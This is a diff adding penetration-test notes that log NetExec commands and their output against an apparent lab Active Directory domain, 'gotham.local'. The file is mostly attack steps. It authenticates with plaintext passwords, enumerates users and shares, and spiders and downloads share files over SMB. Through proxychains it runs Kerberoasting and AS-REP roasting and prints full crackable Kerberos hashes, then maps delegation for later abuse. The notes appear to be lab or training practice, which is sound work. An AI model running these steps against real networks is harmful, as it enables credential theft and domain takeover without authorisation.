@@ -1,1 +1,155 @@
+## 192.168.88.116 (hugo)
+## 172.16.10.100 (dc09)
+## 172.16.10.10 (alfred)
 
+#----- SMB
+└─$ nxc smb 192.168.88.116 -u alfred -p 'P@ssw0rd' -d gotham.local
+SMB         192.168.88.116  445    ARKHAM           [*] Windows 10 / Server 2019 Build 17763 x64 (name:ARKHAM) (domain:gotham.local) (signing:True) (SMBv1:False)
+SMB         192.168.88.116  445    ARKHAM           [+] gotham.local\alfred:P@ssw0rd
+
+└─$ nxc smb 192.168.88.116 -u hugo -p 'Str4ngeMind!' -d gotham.local
+SMB         192.168.88.116  445    ARKHAM           [*] Windows 10 / Server 2019 Build 17763 x64 (name:ARKHAM) (domain:gotham.local) (signing:True) (SMBv1:False)
+SMB         192.168.88.116  445    ARKHAM           [+] gotham.local\hugo:Str4ngeMind! (Pwn3d!)
+
+└─$ nxc smb 192.168.88.116 -u alfred -p 'P@ssw0rd' -d gotham.local --users
+SMB         192.168.88.116  445    ARKHAM           [*] Windows 10 / Server 2019 Build 17763 x64 (name:ARKHAM) (domain:gotham.local) (signing:True) (SMBv1:False)
+SMB         192.168.88.116  445    ARKHAM           [+] gotham.local\alfred:P@ssw0rd
+
+└─$ nxc smb 192.168.88.116 -u hugo -p 'Str4ngeMind!' -d gotham.local --users
+SMB         192.168.88.116  445    ARKHAM           [*] Windows 10 / Server 2019 Build 17763 x64 (name:ARKHAM) (domain:gotham.local) (signing:True) (SMBv1:False)
+SMB         192.168.88.116  445    ARKHAM           [+] gotham.local\hugo:Str4ngeMind! (Pwn3d!)
+SMB         192.168.88.116  445    ARKHAM           -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         192.168.88.116  445    ARKHAM           Adm01                         2025-02-20 04:04:35 0       Built-in account for administering the computer/domain
+SMB         192.168.88.116  445    ARKHAM           DefaultAccount                <never>             0       A user account managed by the system.
+SMB         192.168.88.116  445    ARKHAM           pluto                         2025-04-27 23:18:42 0
+SMB         192.168.88.116  445    ARKHAM           sysadmin                      <never>             0       Built-in account for guest access to the computer/domain
+SMB         192.168.88.116  445    ARKHAM           WDAGUtilityAccount            2025-02-20 19:03:41 0       A user account managed and used by the system for Windows Defender Application Guard scenarios.
+SMB         192.168.88.116  445    ARKHAM           [*] Enumerated 5 local users: ARKHAM
+
+└─$ nxc smb 192.168.88.116 -u hugo -p 'Str4ngeMind!' -d gotham.local --users-export users.txt
+SMB         192.168.88.116  445    ARKHAM           [*] Windows 10 / Server 2019 Build 17763 x64 (name:ARKHAM) (domain:gotham.local) (signing:True) (SMBv1:False)
+SMB         192.168.88.116  445    ARKHAM           [+] gotham.local\hugo:Str4ngeMind! (Pwn3d!)
+SMB         192.168.88.116  445    ARKHAM           -Username-                    -Last PW Set-       -BadPW- -Description-
+SMB         192.168.88.116  445    ARKHAM           Adm01                         2025-02-20 04:04:35 0       Built-in account for administering the computer/domain
+SMB         192.168.88.116  445    ARKHAM           DefaultAccount                <never>             0       A user account managed by the system.
+SMB         192.168.88.116  445    ARKHAM           pluto                         2025-04-27 23:18:42 0
+SMB         192.168.88.116  445    ARKHAM           sysadmin                      <never>             0       Built-in account for guest access to the computer/domain
+SMB         192.168.88.116  445    ARKHAM           WDAGUtilityAccount            2025-02-20 19:03:41 0       A user account managed and used by the system for Windows Defender Application Guard scenarios.
+SMB         192.168.88.116  445    ARKHAM           [*] Enumerated 5 local users: ARKHAM
+SMB         192.168.88.116  445    ARKHAM           [*] Writing 5 local users to users.txt
+
+--
+└─$ nxc smb 192.168.88.116 -u hugo -p 'Str4ngeMind!' -d gotham.local --shares
+SMB         192.168.88.116  445    ARKHAM           [*] Windows 10 / Server 2019 Build 17763 x64 (name:ARKHAM) (domain:gotham.local) (signing:True) (SMBv1:False)
+SMB         192.168.88.116  445    ARKHAM           [+] gotham.local\hugo:Str4ngeMind! (Pwn3d!)
+SMB         192.168.88.116  445    ARKHAM           [*] Enumerated shares
+SMB         192.168.88.116  445    ARKHAM           Share           Permissions     Remark
+SMB         192.168.88.116  445    ARKHAM           -----           -----------     ------
+SMB         192.168.88.116  445    ARKHAM           ADMIN$          READ,WRITE      Remote Admin
+SMB         192.168.88.116  445    ARKHAM           C$              READ,WRITE      Default share
+SMB         192.168.88.116  445    ARKHAM           IPC$            READ            Remote IPC
+SMB         192.168.88.116  445    ARKHAM           share           READ,WRITE
+
+## Only alfred can access
+└─$ nxc smb 192.168.88.116 -u alfred -p 'P@ssw0rd' -d gotham.local -M spider_plus -o DOWNLOAD_FLAG=True
+SMB         192.168.88.116  445    ARKHAM           [*] Windows 10 / Server 2019 Build 17763 x64 (name:ARKHAM) (domain:gotham.local) (signing:True) (SMBv1:False)
+SMB         192.168.88.116  445    ARKHAM           [+] gotham.local\alfred:P@ssw0rd
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*] Started module spidering_plus with the following options:
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*]  DOWNLOAD_FLAG: True
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*]     STATS_FLAG: True
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*] EXCLUDE_FILTER: ['print$', 'ipc$']
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*]   EXCLUDE_EXTS: ['ico', 'lnk']
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*]  MAX_FILE_SIZE: 50 KB
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*]  OUTPUT_FOLDER: /home/batman/.nxc/modules/nxc_spider_plus
+SMB         192.168.88.116  445    ARKHAM           [*] Enumerated shares
+SMB         192.168.88.116  445    ARKHAM           Share           Permissions     Remark
+SMB         192.168.88.116  445    ARKHAM           -----           -----------     ------
+SMB         192.168.88.116  445    ARKHAM           ADMIN$                          Remote Admin
+SMB         192.168.88.116  445    ARKHAM           C$                              Default share
+SMB         192.168.88.116  445    ARKHAM           IPC$            READ            Remote IPC
+SMB         192.168.88.116  445    ARKHAM           share           READ,WRITE
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [+] Saved share-file metadata to "/home/batman/.nxc/modules/nxc_spider_plus/192.168.88.116.json".
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*] SMB Shares:           4 (ADMIN$, C$, IPC$, share)
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*] SMB Readable Shares:  2 (IPC$, share)
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*] SMB Writable Shares:  1 (share)
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*] SMB Filtered Shares:  1
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*] Total folders found:  0
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*] Total files found:    4
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*] File size average:    1.19 KB
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*] File size min:        303 B
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*] File size max:        2.55 KB
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*] File unique exts:     3 (ps1, kdb, txt)
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [*] Downloads successful: 4
+SPIDER_PLUS 192.168.88.116  445    ARKHAM           [+] All files processed successfully.
+
+
+└─$ cat users.txt
+Adm01
+DefaultAccount
+pluto
+sysadmin
+WDAGUtilityAccount
+
+#----- LDAP
+└─$ nxc ldap 192.168.88.142 -u hugo -p 'Str4ngeMind!' -d gotham.local --admin-count
+LDAP        192.168.88.142  389    DC09             [*] Windows 10 / Server 2019 Build 17763 (name:DC09) (domain:gotham.local)
+LDAP        192.168.88.142  389    DC09             [+] gotham.local\hugo:Str4ngeMind!
+LDAP        192.168.88.142  389    DC09             Administrator
+LDAP        192.168.88.142  389    DC09             krbtgt
+LDAP        192.168.88.142  389    DC09             batman
+LDAP        192.168.88.142  389    DC09             alfred
+LDAP        192.168.88.142  389    DC09             bruce
+LDAP        192.168.88.142  389    DC09             hugo
+
+$ proxychains nxc ldap 172.16.10.100 -u hugo -p 'Str4ngeMind!' -d gotham.local --kerberoasting kerb.txt
+
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+LDAP        172.16.10.100   389    DC09             [*] Windows 10 / Server 2019 Build 17763 (name:DC09) (domain:gotham.local)
+LDAP        172.16.10.100   389    DC09             [+] gotham.local\hugo:Str4ngeMind!
+LDAP        172.16.10.100   389    DC09             [*] Skipping disabled account: krbtgt
+LDAP        172.16.10.100   389    DC09             [*] Total of records returned 1
+LDAP        172.16.10.100   389    DC09             [*] sAMAccountName: penguin, memberOf: CN=Rogues,OU=GothamLab,DC=gotham,DC=local, pwdLastSet: 2025-06-22 02:47:38.179884, lastLogon: <never>
+LDAP        172.16.10.100   389    DC09             $krb5tgs$23$*penguin$GOTHAM.LOCAL$gotham.local\penguin*$b76b19b94b2b5796e541d281247fce4c$aaa3d7246676605c1d189cce47e66d3c0e571626f3e44f3ce9e9a61f540dd6b900e8faad3eb362a9d66c146ff4f545a55dbaf0245ba02f95971b4529178ef890e39174d4c7fdfa5010fa4fef5ed05e1efe5601d7862a71fcd51f763c4076ee291b7b83eb08155f1f1a9afa72b602a1607de96638a48c684c140f2a48c75b850f37d8281dabca9b1c74f2a98e701753013f06cfbaee31024eb8a866539ede1ad2fd1906c602ed063b1c4952ea4ff92ba695ef45f72571e19908ae8fdd31731d8d3566bc1bdbce1b485d78fa4dcde0171b6d782b442b3774818b7ed2c9ee2b892749f44f6d60a220dbe92d8c3564fb914ff463eda3866e63f981471fa94ada3fc47196f7bba7a21f52331397123d2eafeab3092ce42831c411dc2f0b08e197f5f7fb6be88aada58d6660cbd0432342fbef0cdf22d630b75bc3b38cbcd055bd15534ab9ce9877b81f2899505066e008817ad63a048c5676165aabb4224f0054f05dcc40b435628bd248adf0181e6f7a48714a3dff28972531e0e02d4eefd3dc5449587827a6d443106feceb4c1d243ea758bc949a52eff00b6106b3d4b8ecf488184c6379fb9581563943ca567c13b21ca68841e22e1872ec49199513624f2d40037913315f1dc025a987cdd8e79c217816a7e2d99af8b58a52929211cc66deb15059005c88dc51ff546f57d750db5145b59030c79f21c3baa2d4dcb551fd9ffc4497d686a2e91781caaa4988f72ed2df6df10f9a012ed7a315b6de0798d9897c937cb7cd761b7af537d819b5fb55a5e8954953879ecbf011e81188a4a6b43f0181cb401e185e16e2dc76b2f07b719902d7f5a965693744cd55f599f2404a303b8c2dae333f0e6fb42e1798fe81fa3f6706dbfd3a2c34d2f28e8aad6addd7c49706a6fdf8cbcb81cb6fce99b10fc9fe74fc409149a6c4e964f66281ebac85986713cebcafe2569ba7170754f6d1dc1527b346fbb9ec5ee4307cf4739bb08e281e6048fb585444e1eaaa7c62749b1dc9aebd917145082b9a5bcc22969ca6714d1fc6a59d372dc6308be42339cf5af907dff7bdd44763bf6a2cb59c11e3a05264d6b12f1b5b4f96914efe66ac0a34c56983981f3021702896a94dd7e38842b69e2f4c7cc38243476bb75e39c64e28defc845cf816fbc63c197fa732e67db4ccff75b5093638e0180e263593221f4130e70e17044c3274e1234961af8e6b196c937f79667c42df8719cdb79e1501f04d9070d4a43bb410fc5b0eb573e4130914997c4f9b
+
+ proxychains nxc ldap 172.16.10.100 -u hugo -p 'Str4ngeMind!' -d gotham.local --asreproast asp.txt
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+LDAP        172.16.10.100   389    DC09             [*] Windows 10 / Server 2019 Build 17763 (name:DC09) (domain:gotham.local)
+LDAP        172.16.10.100   389    DC09             [+] gotham.local\hugo:Str4ngeMind!
+LDAP        172.16.10.100   389    DC09             [*] Total of records returned 1
+LDAP        172.16.10.100   389    DC09             $krb5asrep$23$bane@GOTHAM.LOCAL:c713ca3eb7811faf461d41134925dac5$ff2e5588f152dc9ac9d49a7ac408a722c2a36bdb63f9ad8127d069e8f680a86f185e859b577a388106589151ac35cb15b3cbe5da71510a726240bbdbcb3b7f2ed8ee0558968af2a2767600416a9b07ad23b43a5d4be2cf632ba13dfefba334472c86d0c6b53ab40acc79a3085f9cd53ea891c55e26b2ff5edef4307a4dfb828418e983c47bb48de3c93460e3f716f2debd343b91829ce3a313c3ad709b868dfffe25f269aa469b1381552d2beede094a772f78974be072894d636d547f54b08c44ea2b9c076e5b20d1da4fe68127d3851d0dace9f4e21f418b4840bb39981886647424c4a883b519ccaba442
+
+└─$ proxychains nxc ldap 172.16.10.100 -u hugo -p 'Str4ngeMind!' -d gotham.local --trusted-for-delegation
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+LDAP        172.16.10.100   389    DC09             [*] Windows 10 / Server 2019 Build 17763 (name:DC09) (domain:gotham.local)
+LDAP        172.16.10.100   389    DC09             [+] gotham.local\hugo:Str4ngeMind!
+LDAP        172.16.10.100   389    DC09             DC09$
+LDAP        172.16.10.100   389    DC09             lucius
+
+└─$ proxychains nxc ldap 172.16.10.100 -u hugo -p 'Str4ngeMind!' -d gotham.local --find-delegation
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+LDAP        172.16.10.100   389    DC09             [*] Windows 10 / Server 2019 Build 17763 (name:DC09) (domain:gotham.local)
+LDAP        172.16.10.100   389    DC09             [+] gotham.local\hugo:Str4ngeMind!
+LDAP        172.16.10.100   389    DC09             AccountName AccountType DelegationType             DelegationRightsTo
+LDAP        172.16.10.100   389    DC09             ----------- ----------- -------------------------- ------------------
+LDAP        172.16.10.100   389    DC09             lucius      Person      Unconstrained              N/A
+LDAP        172.16.10.100   389    DC09             DC09$       Computer    Resource-Based Constrained ARKHAM$
+LDAP        172.16.10.100   389    DC09             ARKHAM$     Computer    Constrained                TERMSRV/dc09
+
+
+└─$ proxychains nxc ldap 172.16.10.100 -u hugo -p 'Str4ngeMind!' -d gotham.local --password-not-required
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+LDAP        172.16.10.100   389    DC09             [*] Windows 10 / Server 2019 Build 17763 (name:DC09) (domain:gotham.local)
+LDAP        172.16.10.100   389    DC09             [+] gotham.local\hugo:Str4ngeMind!
+LDAP        172.16.10.100   389    DC09             User: Guest Status: disabled
+
+#-----
